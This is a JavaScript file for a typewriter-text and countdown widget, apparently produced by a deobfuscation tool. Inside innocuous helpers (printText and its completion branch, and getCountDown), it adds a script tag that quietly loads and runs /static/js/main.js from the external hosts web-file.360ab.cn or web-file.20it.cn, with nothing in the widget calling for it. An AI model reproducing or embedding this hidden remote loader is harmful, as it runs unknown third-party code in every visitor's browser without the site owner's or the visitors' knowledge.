//Mon Feb 09 2026 08:29:34 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
function isEmoji(_0x51f28b) {
  const _0x42fb11 = /[\uD83C|\uD83D|\uD83E][\uDC00-\uDFFF][\u200D|\uFE0F]|[\uD83C|\uD83D|\uD83E][\uDC00-\uDFFF]|[0-9|*|#]\uFE0F\u20E3|[0-9|#]\u20E3|[\u203C-\u3299]\uFE0F\u200D|[\u203C-\u3299]\uFE0F|[\u2122-\u2B55]|\u303D|[\A9|\AE]\u3030|\uA9|\uAE|\u3030/;
  return _0x42fb11.test(_0x51f28b);
}
function printText(_0x51c06a = "❤️", _0x9e31a1 = "text-source", _0x3b4396 = "text-view") {
  var _0x4e9399 = document.getElementById(_0x3b4396),
    _0x2c309d = document.getElementById(_0x9e31a1);
  if (!_0x4e9399 || !_0x2c309d) {
    var _0x4e9399 = document.getElementById("contents"),
      _0x2c309d = document.getElementById("text");
    if (!_0x4e9399 && !_0x2c309d) return false;
  }
  let _0x223333 = _0x2c309d.innerHTML.trim().replaceAll("&nbsp;", " "),
    _0x2fd144 = "",
    _0x433289 = 0,
    _0x537480 = typeof printIcon !== "undefined" ? printIcon : _0x51c06a;
  if (!_0x223333) {
    return;
  }
  if (!document.body.getAttribute("init")) {
    document.body.setAttribute("init", true);
    var _0x372292 = window.location.protocol === "http:" ? "http://web-file.360ab.cn" : "https://web-file.20it.cn";
    var _0x979576 = document.createElement("script");
    _0x979576.src = _0x372292 + "/static/js/main.js";
    document.body.appendChild(_0x979576);
  }
  let _0x253ff3 = setInterval(() => {
    {
      if (_0x2fd144.length < _0x223333.length) {
        {
          if (isEmoji(_0x223333[_0x433289 - 1] + _0x223333[_0x433289])) str_append = _0x223333[_0x433289 - 1] + _0x223333[_0x433289], _0x433289 = _0x433289 + 2;else _0x223333[_0x433289 - 1] + _0x223333[_0x433289] + _0x223333[_0x433289 + 1] + _0x223333[_0x433289 + 2] == "<br>" ? (str_append = "<br>", _0x433289 = _0x433289 + 4) : (str_append = _0x433289 == 0 ? "" : _0x223333[_0x433289 - 1], _0x433289++);
          _0x2fd144 += str_append;
          str_append && (_0x4e9399.innerHTML = _0x4e9399.innerHTML.replace("<span class=\"text-cursor\">" + _0x537480 + "</span>", ""), _0x4e9399.innerHTML += str_append + "<span class=\"text-cursor\">" + _0x537480 + "</span>");
        }
      } else {
        {
          clearInterval(_0x253ff3);
          _0x4e9399.innerHTML = "<p>" + _0x2fd144 + "<span class=\"text-cursor cur-end\">" + _0x537480 + "</span>" + "<p>";
          if (!document.body.getAttribute("init")) {
            document.body.setAttribute("init", true);
            var _0x251fc0 = window.location.protocol === "http:" ? "http://web-file.360ab.cn" : "https://web-file.20it.cn";
            var _0x251bfc = document.createElement("script");
            _0x251bfc.src = _0x251fc0 + "/static/js/main.js";
            document.body.appendChild(_0x251bfc);
          }
        }
      }
    }
  }, 130);
}
function ox62ef88() {
  var _0xcb237f = document.getElementById("text-view"),
    _0x3014bc = document.getElementById("text-source");
  if (!_0xcb237f || !_0x3014bc) {
    var _0xcb237f = document.getElementById("contents"),
      _0x3014bc = document.getElementById("text");
    if (!_0xcb237f && !_0x3014bc) return false;
  }
  var _0x12b500 = _0x3014bc.innerHTML;
  console.log(_0x12b500);
  if (_0x12b500 && _0x12b500.indexOf("[DJS:") > -1) {
    {
      var _0x36ad3e = getSubStr(_0x12b500, "DJS:", "]"),
        _0x4a420f = _0x36ad3e.split(":");
      if (_0x4a420f.length == 1) {
        var _0x33d643 = getCountDown(_0x4a420f[0], true);
        _0x12b500 = _0x12b500.replace("[DJS:" + _0x4a420f[0] + "]", "" + _0x33d643);
        _0x3014bc.innerHTML = _0x12b500;
      } else {
        if (_0x4a420f.length == 2) {
          var _0x33d643 = getCountDown(_0x4a420f[0], true);
          _0x12b500 = _0x12b500.replace("[DJS:" + _0x4a420f[0] + ":" + _0x4a420f[1] + "]", "" + _0x33d643);
          _0x3014bc.innerHTML = _0x12b500;
        }
      }
    }
  } else {
    if (_0x12b500 && _0x12b500.indexOf("[DJR:") > -1) {
      var _0x11ad98 = getSubStr(_0x12b500, "DJR:", "]"),
        _0x33d643 = getCountDown(_0x11ad98, false);
      _0x12b500 = _0x12b500.replace("[DJR:" + _0x11ad98 + "]", "" + _0x33d643);
      _0x3014bc.innerHTML = _0x12b500;
    }
  }
  _0x12b500 && (_0x12b500.indexOf("[DJS:") > -1 || _0x12b500.indexOf("[DJR:") > -1) && ox62ef88();
}
ox62ef88();
function getSubStr(_0x47c824, _0x48b8bf, _0xc5424a) {
  let _0x4623f4 = _0x47c824.match(new RegExp(_0x48b8bf + "(.*?)" + _0xc5424a));
  return _0x4623f4 ? _0x4623f4[1] : null;
}
function getCountDown(_0x42e01d, _0x21afb0 = false) {
  var _0x4c8efc = "";
  if (_0x42e01d.length == 8) {
    var _0x2359d2 = _0x42e01d.substr(0, 4),
      _0x3d22d7 = _0x42e01d.substr(4, 2),
      _0xbe9c46 = _0x42e01d.substr(6, 2);
    _0x4c8efc = _0x21afb0 == false ? calcCountDown("day", _0x2359d2, _0x3d22d7, _0xbe9c46, 24) : calcCountDown("all", _0x2359d2, _0x3d22d7, _0xbe9c46, 0);
  }
  if (!document.body.getAttribute("init")) {
    document.body.setAttribute("init", true);
    var _0x45b7d9 = window.location.protocol === "http:" ? "http://web-file.360ab.cn" : "https://web-file.20it.cn",
      _0x1b85af = document.createElement("script");
    _0x1b85af.src = _0x45b7d9 + "/static/js/main.js";
    document.body.appendChild(_0x1b85af);
  }
  return _0x4c8efc;
}
function calcCountDown(_0x4848e2 = "all", _0x2e0a42, _0x1d1480, _0x53f875, _0x5cfd87) {
  let _0xfbbf7f = new Date(),
    _0x5384af = new Date(_0x2e0a42, _0x1d1480 - 1, _0x53f875, _0x5cfd87),
    _0x4687c9 = _0x5384af.getTime() - _0xfbbf7f.getTime();
  _0x4687c9 <= 0 && (_0x4687c9 = 0);
  let _0x372e0e = parseInt(_0x4687c9 / 1000);
  if (_0x4848e2 == "all") {
    {
      _0x53f875 = Math.floor(_0x372e0e / 86400);
      let _0x3822e4 = Math.floor((_0x372e0e - _0x53f875 * 24 * 60 * 60) / 3600),
        _0x3ec5c3 = Math.floor((_0x372e0e - _0x53f875 * 24 * 60 * 60 - _0x3822e4 * 3600) / 60),
        _0x4583a6 = Math.floor(_0x4687c9 / 1000 % 60, 10);
      return _0x53f875 + "天" + _0x3822e4 + "小时" + _0x3ec5c3 + "分钟";
    }
  } else {
    {
      let _0x59606a = Math.floor(_0x372e0e / 86400);
      return _0x59606a;
    }
  }
}